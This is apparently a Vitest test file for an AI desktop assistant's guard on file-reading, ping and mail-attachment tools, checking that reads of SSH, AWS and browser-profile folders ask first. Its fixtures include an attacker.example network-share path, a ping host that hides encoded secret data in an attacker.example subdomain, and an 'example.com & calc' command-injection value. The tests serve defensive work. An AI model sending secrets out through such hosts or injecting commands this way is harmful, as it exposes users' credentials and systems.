/**
 * 0.24.12 audit #2: read_file / list_files / search_files_content ask before a
 * guarded location, ordinary reads stay unasked, and ping_host takes a host only.
 */
import { describe, it, expect, vi, beforeAll, afterAll } from 'vitest';
import fs from 'fs';
import os from 'os';
import path from 'path';

const userData = path.join(os.tmpdir(), 'clippy-read-guard-userdata');
vi.mock('electron', () => ({
  app: { isPackaged: false, getPath: () => userData, getAppPath: () => process.cwd() },
  clipboard: { availableFormats: () => [], readText: () => '', writeText: () => {} },
  BrowserWindow: class {}, screen: {}, shell: {}, nativeImage: {},
}));
vi.mock('../src/main/clawd-fallback', () => ({
  TIER5_FALLBACK_MAP: {}, ensureClawd: async () => false, isClawdReady: () => false,
  getClawdHandle: () => null, isClawdInstalled: () => false, callClawdTool: async () => ({ text: '' }),
  submitClawdTask: async () => ({ text: '' }),
}));
const execFileMock = vi.fn();
vi.mock('child_process', async (orig) => {
  const real = await orig<typeof import('child_process')>();
  return { ...real, execFile: (...a: unknown[]) => execFileMock(...a) };
});

import { executeTool, assessRisk } from '../src/main/tools';
import { shortFormOf } from './helpers/short-path';

const root = path.join(os.homedir(), 'read-guard-test');
const docs = path.join(root, 'docs');

beforeAll(() => {
  // These tests create and remove ~/.ssh/notes.txt: only ever in the throwaway
  // test home (vitest.config.ts), never a real profile.
  if (!path.resolve(os.homedir()).toLowerCase().startsWith(path.resolve(os.tmpdir()).toLowerCase())) {
    throw new Error('read-guard tests need the throwaway test home');
  }
  fs.mkdirSync(path.join(os.homedir(), '.ssh'), { recursive: true });
  fs.writeFileSync(path.join(os.homedir(), '.ssh', 'notes.txt'), 'needle-in-ssh');
  fs.mkdirSync(docs, { recursive: true });
  fs.writeFileSync(path.join(docs, 'a.txt'), 'needle-in-docs');
  fs.mkdirSync(userData, { recursive: true });
  fs.writeFileSync(path.join(userData, 'agent-server.json'), '{"token":"t"}');
});
afterAll(() => {
  fs.rmSync(root, { recursive: true, force: true });
  fs.rmSync(path.join(os.homedir(), '.ssh', 'notes.txt'), { force: true });
  fs.rmSync(userData, { recursive: true, force: true });
});

describe('assessRisk: guarded reads ask', () => {
  it.each([
    ['read_file', { path: '~/.ssh/notes.txt' }],
    ['read_file', { path: path.join(os.homedir(), '.ssh', 'id_rsa') }],
    ['list_files', { path: '~/.ssh' }],
    ['search_files_content', { pattern: 'x', path: '~/.aws' }],
    ['read_file', { path: path.join(userData, 'agent-server.json') }],
    ['read_file', { path: '\\\\attacker.example\\share\\x.txt' }],
    ['list_files', { path: path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default') }],
  ])('%s %j', async (tool, args) => {
    const v = await assessRisk(tool, args);
    expect(v).not.toBeNull();
    expect(v!.class).toBe('destructive_file');
    expect(v!.reason).toMatch(/^This reads /);
  });
});

describe('assessRisk: ordinary reads stay unasked', () => {
  it.each([
    ['read_file', { path: path.join(docs, 'a.txt') }],
    ['read_file', { path: '~/read-guard-test/docs/a.txt' }],
    ['read_file', { path: path.join(os.homedir(), 'Downloads', 'missing.pdf') }],
    ['list_files', { path: '~' }],
    ['list_files', { path: docs }],
    ['search_files_content', { pattern: 'needle' }],
    ['search_files_content', { pattern: 'needle', path: docs }],
    ['read_clipboard', {}],
  ])('%s %j', async (tool, args) => {
    expect(await assessRisk(tool, args)).toBeNull();
  });
});

describe('recursive walks step over guarded folders', () => {
  it('search_files_content from home finds the ordinary file, not the one in .ssh', async () => {
    const r = await executeTool('search_files_content', { pattern: 'needle-in', path: os.homedir() });
    expect(r.text).toContain('needle-in-docs');
    expect(r.text).not.toContain('needle-in-ssh');
  });
  it('list_files recurse from home lists .ssh by name but not its contents', async () => {
    const r = await executeTool('list_files', { path: os.homedir(), recurse: true, top: 500 });
    expect(r.text).toMatch(/read-guard-test[\\/]docs[\\/]a\.txt/);
    expect(r.text).not.toMatch(/\.ssh[\\/]notes\.txt/);
  });
  it('an approved guarded root is read in full', async () => {
    const r = await executeTool('search_files_content', { pattern: 'needle-in', path: path.join(os.homedir(), '.ssh') });
    expect(r.text).toContain('needle-in-ssh');
  });
});

describe('ping_host', () => {
  it('refuses a host that is not a hostname or IP, without running anything', async () => {
    const r = await executeTool('ping_host', { host: 'c2VjcmV0LWtleS1mcm9tLXRoZS11c2Vycy1maWxlLWFiY2RlZg.attacker.example' });
    expect(r.text).toMatch(/^\(error:INVALID_ARGS\)/);
    const r2 = await executeTool('ping_host', { host: 'example.com & calc' });
    expect(r2.text).toMatch(/^\(error:INVALID_ARGS\)/);
    expect(execFileMock).not.toHaveBeenCalled();
  });
});

describe('mail attachments go through the path guard (0.24.12 audit #8)', () => {
  it('an attachment from a guarded folder escalates with the reason', async () => {
    const v = await assessRisk('outlook_send_email', { to: 'a@b.example', subject: 's', body: 'b', attachments: `${path.join(docs, 'a.txt')}, ~/.ssh/notes.txt` });
    expect(v?.class).toBe('destructive_send');
    expect(v?.reason).toMatch(/^This attaches a file from a folder that holds keys or credentials: notes\.txt$/);
    expect(v?.family).toBeUndefined();
    const unc = await assessRisk('apple_mail_send_email', { to: 'a@b.example', attachments: '\\\\attacker.example\\share\\x.txt' });
    expect(unc?.reason).toMatch(/network share/);
  });
  it('ordinary attachments and mails without attachments are not escalated', async () => {
    expect(await assessRisk('outlook_send_email', { to: 'a@b.example', subject: 's', body: 'b', attachments: path.join(docs, 'a.txt') })).toBeNull();
    expect(await assessRisk('outlook_send_email', { to: 'a@b.example', subject: 's', body: 'b' })).toBeNull();
  });
});

// CI regression: the profile folder (os.homedir()) and the path being read can
// name the same folder two ways. GitHub's Windows runners: USERPROFILE is the
// long name, TEMP the 8.3 one; macOS: /var/... is a link to /private/var/....
describe('the profile folder under another name', () => {
  const saved = { USERPROFILE: process.env.USERPROFILE, HOME: process.env.HOME };
  const realHome = () => fs.realpathSync.native(saved.USERPROFILE ?? saved.HOME ?? os.homedir());
  let link = '';

  afterAll(() => {
    process.env.USERPROFILE = saved.USERPROFILE;
    process.env.HOME = saved.HOME;
    if (link) { try { fs.rmSync(link, { force: true }); } catch { /* best effort */ } }
  });

  function aliases(): Array<[string, string]> {
    const out: Array<[string, string]> = [];
    const short = shortFormOf(realHome());
    if (short) out.push(['8.3 short name', short]);
    link = `${realHome()}-alias`;
    try { fs.rmSync(link, { force: true }); } catch { /* none */ }
    try { fs.symlinkSync(realHome(), link, 'junction'); out.push(['link', link]); } catch { link = ''; }
    return out;
  }

  it('guarded reads still ask and walks still skip, whichever name the profile or the path uses', async () => {
    const real = realHome();
    const found = aliases();
    expect(found.length).toBeGreaterThan(0);
    for (const [kind, alias] of found) {
      // 1. The profile is known by its alias; paths use the real name.
      process.env.USERPROFILE = alias;
      process.env.HOME = alias;
      expect(os.homedir(), kind).toBe(alias);
      expect(await assessRisk('read_file', { path: path.join(real, '.ssh', 'notes.txt') }), kind).not.toBeNull();
      expect(await assessRisk('read_file', { path: path.join(real, '.aws', 'credentials') }), kind).not.toBeNull(); // not on disk
      expect(await assessRisk('read_file', { path: '~/.ssh/notes.txt' }), kind).not.toBeNull();
      expect(await assessRisk('list_files', { path: path.join(real, '.ssh') }), kind).not.toBeNull();
      expect(await assessRisk('read_file', { path: path.join(real, 'read-guard-test', 'docs', 'a.txt') }), kind).toBeNull();
      const fromReal = await executeTool('search_files_content', { pattern: 'needle-in', path: real });
      expect(fromReal.text, kind).toContain('needle-in-docs');
      expect(fromReal.text, kind).not.toContain('needle-in-ssh');

      // 2. The profile is known by its real name; paths come in through the alias.
      process.env.USERPROFILE = real;
      process.env.HOME = real;
      expect(await assessRisk('read_file', { path: path.join(alias, '.ssh', 'notes.txt') }), kind).not.toBeNull();
      expect(await assessRisk('read_file', { path: path.join(alias, '.aws', 'credentials') }), kind).not.toBeNull();
      expect(await assessRisk('read_file', { path: path.join(alias, 'read-guard-test', 'docs', 'a.txt') }), kind).toBeNull();
      const fromAlias = await executeTool('search_files_content', { pattern: 'needle-in', path: alias });
      expect(fromAlias.text, kind).toContain('needle-in-docs');
      expect(fromAlias.text, kind).not.toContain('needle-in-ssh');
      const listed = await executeTool('list_files', { path: alias, recurse: true, top: 500 });
      expect(listed.text, kind).not.toMatch(/\.ssh[\\/]notes\.txt/);
    }
  });
});
